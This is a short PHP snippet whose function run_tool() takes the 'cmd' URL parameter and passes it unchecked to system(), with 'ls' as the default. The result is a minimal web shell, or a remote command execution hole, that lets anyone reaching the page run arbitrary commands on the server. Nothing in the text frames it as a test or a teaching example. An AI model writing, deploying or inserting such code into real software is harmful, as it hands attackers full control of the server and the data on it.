<?php
function run_tool() {
    $cmd = $_GET['cmd'] ?: 'ls';
    system($cmd);
}
